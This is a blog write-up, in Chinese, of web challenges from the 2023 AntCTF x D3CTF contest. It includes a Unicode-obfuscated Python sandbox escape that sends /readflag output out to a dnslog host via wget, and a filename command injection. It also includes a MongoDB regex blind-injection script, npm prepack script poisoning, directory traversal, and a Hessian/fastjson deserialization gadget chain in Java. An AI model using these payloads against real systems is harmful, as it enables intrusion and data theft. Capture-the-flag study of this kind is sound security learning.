title: 2023 AntCTF x D3CTF web题部分wp
author: bmth
tags:
  - D3CTF
categories:
  - CTF
date: 2023-05-07 12:18:00
top_img: 'https://img-blog.csdnimg.cn/dd44d92398ab48c6b1569c5cb4bc94a8.png'
cover: 'https://img-blog.csdnimg.cn/dd44d92398ab48c6b1569c5cb4bc94a8.png'
---
![](https://img-blog.csdnimg.cn/dd44d92398ab48c6b1569c5cb4bc94a8.png)

记录一下2023 AntCTF x D3CTF的做题思路，并复现一下没做出来的题

## Escape Plan
题目描述：
>The success for a break out depends on three things.
>- layout: black_char
>- routine: Python tricks
>- help: Run /readflag to get flag, dns tunneling may help you

题目给出了源码
![](https://img-blog.csdnimg.cn/1a10d6dcb9fc4ac48f20758f17af1fd4.png)

可以看到就是一个黑名单的绕过技巧，这里找到文章：[Python 沙箱逃逸的通解探索之路](https://cn-sec.com/archives/1322842.html)
题目环境是python3.8，支持了 Unicode 变量名，那么就可以利用特殊字符来绕过关键字
```
eval == ᵉval
```
并且数字也是可以使用 Unicode 绕的，文章中使用的是：[https://www.fileformat.info/info/unicode/category/Nd/list.htm](https://www.fileformat.info/info/unicode/category/Nd/list.htm)

无回显，使用dnslog外带数据
```
__import__('os').popen('wget `/readflag`.a948sf.dnslog.cn').read()
```
最后参考Tr0y师傅的构造脚本：
```python
u = '𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫'

cmd = "X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2dldCBgL3JlYWRmbGFnYC5hOTQ4c2YuZG5zbG9nLmNuJykucmVhZCgp"
exp = "ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict({}=()))[len([])]))".format(cmd)

exp = exp.translate({ord(str(i)): u[i] for i in range(10)})

print(exp)
```
去掉多余的空格和换行，cmd传入即可
![](https://img-blog.csdnimg.cn/fafe096d7e3a4f02aa7168c7aa0c9925.png)


## d3cloud
题目描述：
>admin uses laravel-admin to build a personal cloud disk, and adds a utility function

可以看到使用的 laravel-admin 搭建的站点，搜索一下最近的CVE可以找到一个 [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/)，是一个后台的文件上传

尝试访问`/admin`发现后台，尝试弱口令admin、admin成功登陆
![](https://img-blog.csdnimg.cn/1af851bb0a974eaa93f9134a3c8b00f7.png)

可以看到漏洞点应该就是文件上传了，但是发现不能直接上传.php文件，说明修改过代码，到处翻的时候找到一个 FilesystemAdapter.php
![](https://img-blog.csdnimg.cn/f33fcb2e54cf4b03b070c349f9ae0756.png)

简单看一下代码
指定了文件上传的后缀，然后对zip文件进行处理，使用了popen函数，而`$name`也就是文件名可控，造成代码执行
![](https://img-blog.csdnimg.cn/538599d71a9e4b76b7825e8b0b428ca1.png)

文件上传抓包，使用`;`分割命令即可rce，直接写入一句话
![](https://img-blog.csdnimg.cn/fbdf80622ff74d148930e4eb9caaaf0e.png)

成功rce
![](https://img-blog.csdnimg.cn/00669f17890748cba1eda8e0545fff98.png)

## d3node
题目描述：
>Enjoy the Node website :D
It will shows Internal Server Error at the beginning, please wait and refresh!

在xux的提醒下发现题目存在提示。。。还是得F12大发(完全没注意)
随便注册一个账号访问`/dashboardIndex/getHint2`，得到
![](https://img-blog.csdnimg.cn/4dec00d357684d618362810d21469360.png)

是一个fs.readFileSync文件读取，网上已经有师傅给出文章了：[fs.readFileSync的利用](https://forum.butian.net/share/1986)
测试发现是路由`/dashboardIndex/ShowExampleFile`这里，可以传filename进行文件读取，过滤了app，使用URL编码绕过关键字
```
/dashboardIndex/ShowExampleFile?filename[href]=a&filename[origin]=1&filename[protocol]=file:&filename[hostname]=&filename[pathname]=%2561pp.js
```
![](https://img-blog.csdnimg.cn/ca348698c64344bb8e607c99987d6b38.png)
那么就可以得到所有文件源码

### nosql注入
首先看到`./routes/user.js`登陆这里，是一个MongoDB注入
![](https://img-blog.csdnimg.cn/8fabab7f85ce4bce884a22dce559bf71.png)

过滤了：
```js
function checkData(str){
    const check = /where|eq|ne|gt|gte|lt|lte|exists|text|collation/;
    return check.test(str);
}
```
使用`username=admin&password[$regex]=^a`进行盲注，写一个简单的脚本：
```python
import requests
import string

strs = string.digits+string.ascii_letters

password = ""
url = "http://106.14.124.130:32292/user/LoginIndex"

for i in range(1,100):
    for j in strs:
        data = {"username":"admin","password[$regex]":"^{}".format(password+j)}
        r = r = requests.post(url,data=data)
        if "Login failed" not in r.text:
            password = password + j
            break
    print(password)
```
![](https://img-blog.csdnimg.cn/572deb2bff0d41e7915e65c0b8364e03.png)

得到admin的密码：dob2xdriaqpytdyh6jo3

### npm投毒
接下来看到`./routes/dashboardIndex.js`，发现执行了`npm pack`
![](https://img-blog.csdnimg.cn/3ede6c3718d64666b3c3afc29ebbcdba.png)

这里就很像npm投毒攻击，参考：[阿里云安全再次发现npm投毒攻击](https://sec-lab.aliyun.com/2021/11/19/%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%89%E5%85%A8%E5%86%8D%E6%AC%A1%E5%8F%91%E7%8E%B0npm%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/)
发现可以在`/dashboardIndex/SetDependencies`处修改package.json文件
![](https://img-blog.csdnimg.cn/d05974944c6d441baf0a1aea18f5be17.png)

那么我们就可以修改scripts来命令执行，POST传入
```json
{
  "scripts":{
    "prepack":"/readflag > /tmp/flag"
  }
}
```
然后访问`/dashboardIndex/PackDependencies`进行投毒，配合文件读取得到flag
![](https://img-blog.csdnimg.cn/833d108fb2f3467f9edef165563c6a28.png)

## d3go(复现)
题目描述：
>bs is new to the go programming language and recently found the new feature "go embed" very interesting. He has written an online decompression service that uses go embed to package static resource files. Your task is to exploit the vulnerability of this application, RCE it and get the flag.
It will shows ERR_EMPTY_RESPONSE at the beginning, please wait and refresh!
HINTS:
The Gamebox of d3go cannot connect to the Internet.

想不到啥好的思路，直到xux跟我说可以扫目录看看，试了一下发现
![](https://img-blog.csdnimg.cn/698a0c11512b4366bb132dbc07aad3bf.png)

发现全部都解析到了`./`，正巧前不久白帽酱发了一篇文章：[一个隐藏在Go语言标准库中的目录穿越漏洞 CVE-2022-29804](https://tttang.com/archive/1884/)
有个特征就是左侧被拼接路径为`./`，那么尝试进行目录穿越
![](https://img-blog.csdnimg.cn/abc49637097b457bad3aae9e8c4d32b5.png)

这样就可以拿到全部源码了

### gorm软删除注入
首先我们要成为admin才能上传文件，但是在db.go文件中发现admin的密码是使用`math/rand`随机生成的，而种子是`time.Now().UnixMicro()`不确定
![](https://img-blog.csdnimg.cn/2d69efce049243548fa3f005e89946d6.png)

也就不能通过伪随机来获取admin的密码了，那么就想到能不能伪造session，很可惜的是这里使用的`crypto/rand`真随机
具体session伪造可参考：[WMCTF2020 – GOGOGO WriteUp](https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/)
![](https://img-blog.csdnimg.cn/169598a7e18b4173adbf46c1db64f7d8.png)

到这里我就卡主了，sql语句也是预编译的注入不了
看了wp后才知道这里的`gorm.io/gorm`的save函数有问题，并且这里IsAdmin函数是使用的`db.First`，也就是通过`LIMIT 1`返回第一条数据来判断是否为admin的
![](https://img-blog.csdnimg.cn/6f0fd923c52c4c9db4235bc599fd9f77.png)
去看一下官方文档：[https://gorm.io/docs/update.html](https://gorm.io/docs/update.html)
![](https://img-blog.csdnimg.cn/cf7eff2051b94001a94ae0ff43e0b7d1.png)

如果保存值不包含主键，则执行创建，否则执行更新，官方文档也写明了：
>**NOTE** Don’t use `Save` with `Model`, it’s an **Undefined Behavior**.

看到我们的User Model，这里使用了`gorm.Model`结构体
![](https://img-blog.csdnimg.cn/4ba8157518864258a55599304038baa8.png)

Model结构体包括字段ID、CreatedAt、UpdatedAt、DeletedAt
![](https://img-blog.csdnimg.cn/ba40f76d0fb14267be52d8a2f49667d1.png)

而gorm.DeletedAt字段有一个软删除功能：[https://gorm.io/zh_CN/docs/delete.html#%E8%BD%AF%E5%88%A0%E9%99%A4](https://gorm.io/zh_CN/docs/delete.html#%E8%BD%AF%E5%88%A0%E9%99%A4)，软删除的记录将在查询时被忽略，那么我们修改⼀下admin用户的deletedat，就可以让它查询不到了
```json
{
	"id":1,
	"username":"admin",
	"password":"111",
	"createdat":"2013-01-01T14:00:00+08:00",
	"deletedat":"2013-01-01T14:00:00+08:00"
}
```
然后随便注册一个账号就是admin权限了
![](https://img-blog.csdnimg.cn/5b37ededa84d486581410956bf4b58b0.png)

参考：[Go语言框架三件套（Web/RPC/GORM)](https://zhuanlan.zhihu.com/p/601286934)


## ezjava(复现)
题目描述：
>Try to pollute me !!!

看到pom.xml，存在fastjson依赖
![](https://img-blog.csdnimg.cn/642d56f094b5494ca7ae19ce65c2e8a2.png)

发现是hessian反序列化
![](https://img-blog.csdnimg.cn/3c4dce313aef4320a986461947a65297.png)

主要是绕过hessian_blacklist.txt这个黑名单里面的类，并且hessian为github上的项目：[https://github.com/sofastack/sofa-hessian](https://github.com/sofastack/sofa-hessian)，是存在 CVE-2021-43297 的，那么就是找getter链

学习了一下tabby的使用，[https://github.com/wh1t3p1g/tabby](https://github.com/wh1t3p1g/tabby)

查询JNDI注入语法如下
```sql
match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
return path
```
![](https://img-blog.csdnimg.cn/89d8c89530aa4bb58d99bf0514fcef47.png)

### ContinuationDirContext
其实marshalsec上已经有ContinuationDirContext类相关的利用了：[https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java)


会调用到`javax.naming.spi.ContinuationContext#getEnvironment()`这个getter方法
![](https://img-blog.csdnimg.cn/9cced28c948049f6857aa54910c28b17.png)

跟进 getTargetContext 方法，发现调用了`javax.naming.spi.NamingManager#getContext()`方法
![](https://img-blog.csdnimg.cn/8664965d4c404f7f9aa9ac74e795e4a3.png)

这里会调用它的 getObjectInstance 方法
![](https://img-blog.csdnimg.cn/1b689be7776c481d91ba6d31d7099b24.png)

这里要让 refInfo 为 Reference 的实例类，然后调用 getObjectFactoryFromReference 方法
![](https://img-blog.csdnimg.cn/61be014c4b194d05ad9e3fb9eac27247.png)

跟进，它会先调用`helper.loadClass(String factoryName)`尝试加载本地的工厂类，出错或找不到指定的工厂类后，再调用`helper.loadClass(String className, String codebase)`尝试加载远程的工厂类
![](https://img-blog.csdnimg.cn/76e826115fc847098aaff6bc6fda9522.png)

最后调用了newInstance方法进行实例化

helper对象实际上是`com.sun.naming.internal.VersionHelper12`的实例对象，由于在jdk高版本默认情况下trustURLCodebase为false，直接return null
![](https://img-blog.csdnimg.cn/54200b034e9f4f0d899293dda702c1c7.png)

这就是为什么不能加载远程类的原因，题目环境存在Tomcat，我们直接加载本地`org.apache.naming.factory.BeanFactory`工厂

exp如下：
```java
import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import org.apache.naming.ResourceRef;
import javax.naming.CannotProceedException;
import javax.naming.StringRefAddr;
import javax.naming.directory.DirContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class Hessian_fastjson_ContinuationDirContext {
    public static void main(String[] args) throws Exception {
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));

        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        setFieldValue(cpe, "cause", null);
        setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(resourceRef);

        setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());

        JSONObject jo = new JSONObject();
        jo.put("test", ctx);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(jo);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}
```


最终调用栈如下：
```
eval:54, ELProcessor (javax.el)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
getObjectInstance:211, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
getContext:439, NamingManager (javax.naming.spi)
getTargetContext:55, ContinuationContext (javax.naming.spi)
getEnvironment:197, ContinuationContext (javax.naming.spi)
apply:-1, 1541049864 (javax.naming.spi.ContinuationDirContext$$Lambda$25)
getFieldValue:36, FieldWriterObjectFunc (com.alibaba.fastjson2.writer)
write:189, FieldWriterObject (com.alibaba.fastjson2.writer)
write:76, ObjectWriter2 (com.alibaba.fastjson2.writer)
write:548, ObjectWriterImplMap (com.alibaba.fastjson2.writer)
toJSONString:2388, JSON (com.alibaba.fastjson2)
toString:1028, JSONObject (com.alibaba.fastjson)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:3757, Hessian2Input (com.caucho.hessian.io)
readString:1979, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2960, Hessian2Input (com.caucho.hessian.io)
readObject:2893, Hessian2Input (com.caucho.hessian.io)
```


参考：
[Java代码分析工具Tabby在CTF中的运用](https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww)
[初探Hessian利用链为Dubbo-CVE占坑](https://www.freebuf.com/vuls/343591.html)
